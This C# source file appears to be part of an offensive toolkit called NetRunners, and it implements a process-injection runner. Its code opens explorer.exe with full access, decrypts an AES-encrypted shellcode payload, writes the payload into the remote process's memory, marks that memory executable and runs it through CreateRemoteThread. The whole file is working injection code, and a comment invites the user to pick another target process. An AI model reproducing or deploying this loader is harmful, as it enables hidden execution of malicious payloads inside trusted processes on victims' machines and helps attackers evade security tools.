using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

using NetRunners.Interfaces;
using static NetRunners.Delegates.Delegate;
using static NetRunners.Helpers.Helper;
using static NetRunners.Data.WinConstants;
using static NetRunners.Decryptors.AesDecryptor;
using static NetRunners.Data.EncryptedData;

namespace NetRunners.Runners
{
    public class ProcessInjectionRunner : IRunner
    {
        public void Run(string[] args = null)
        {
            IntPtr hProcess = default;
            int processID = 0;

            // print technique name and target process (if applicable)
            string techniqueName = "Process Injection";
            string targetProcess = "explorer";                          // Change the target process if you like (do not add extension)
            PrintTechniqueInfo(techniqueName, targetProcess);

            // get process handle, determine process architecture
            Process[] targetPid = Process.GetProcessesByName(targetProcess.Split('.')[0]);  
            foreach (Process process in targetPid)
            {
                processID = process.Id;
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, (uint)process.Id);
                if (hProcess == IntPtr.Zero)
                {
                    throw new InvalidOperationException($"[-] OpenProcess failed for process ID {processID} with error code: {Marshal.GetLastWin32Error()}");
                }
            }

            bool Is32BitProcess;
            IsWow64Process(hProcess,out Is32BitProcess);

            // perform architecture check
            if (IntPtr.Size == 4 && (!Is32BitProcess))
            {
                Console.WriteLine($"[-] Cannot inject shellcode into {targetProcess} (x64) process from a x86 process." + "\n" + "[+] Use -npi or run x64 NR.exe.");
                System.Environment.Exit(1);
            }

            // retrieve unencrypted payload size
            int sBuf = SelectPayloadSize(Is32BitProcess);

            // perform memory allocation, print pid + allocated address info
            IntPtr pMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sBuf, MEM_COMMIT_RESERVE, PAGE_READWRITE);
            if (pMemory == IntPtr.Zero)
                throw new InvalidOperationException($"[-] VirtualAllocEx failed with error code: {Marshal.GetLastWin32Error()}");

            var allocAddress = string.Format("{0:X}", pMemory);        // Pointer -> String
            UInt64 number = UInt64.Parse(allocAddress);                 // String -> Int
            string allocAddressHex = number.ToString("x");              // Int -> Hex
            Console.WriteLine("[+] RW Memory Address (VirtualAllocEx) to remote processID-> " + processID + " on Mem.Address ->" + "0x" + allocAddressHex);

            // select and decrypt payload
            byte[] buf = SelectPayloadArchitecture(Is32BitProcess);
            buf = DecryptBytesToBytesAes(buf, AesKey);

            // copy payload to allocated memory
            IntPtr outSize = IntPtr.Zero;
            WriteProcessMemory(hProcess, pMemory, buf, buf.Length, out outSize);
            if (outSize == IntPtr.Zero)
                throw new InvalidOperationException($"[-] WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");
            Console.WriteLine("[+] Payload has been written to the buffer!");

            // change memory protection to exec read
            uint oldProtect;
            int bVP = VirtualProtectEx(hProcess, pMemory, (UIntPtr)sBuf, PAGE_EXECUTE_READ, out oldProtect);
            if (bVP != 1) // not true
                throw new InvalidOperationException($"VirtualProtect failed with error code: {Marshal.GetLastWin32Error()}");
            Console.WriteLine("[+] Memory Address protections changed to EXECUTE_READ");

            //Enumerate the threads of the remote process before creating a new one.
            List<int> threadList = new List<int>();
            ProcessThreadCollection threadsBefore = Process.GetProcessById(processID).Threads;
            foreach (ProcessThread thread in threadsBefore)
            {
                threadList.Add(thread.Id);
            }

            //Create a remote thread and execute it
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pMemory, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
                throw new InvalidOperationException($"[-] WriteProcessMemory failed with error code: {Marshal.GetLastWin32Error()}");

            //Enumerate threads from the given process. Print thread info
            ProcessThreadCollection threads = Process.GetProcessById(processID).Threads;
            foreach(ProcessThread thread in threads)
            {
                if (!threadList.Contains(thread.Id))
                {
                    Console.WriteLine("Start Time:" + thread.StartTime + " Thread ID:" + thread.Id + " Thread State:" + thread.ThreadState);
                }   
            }
        }
    }
}
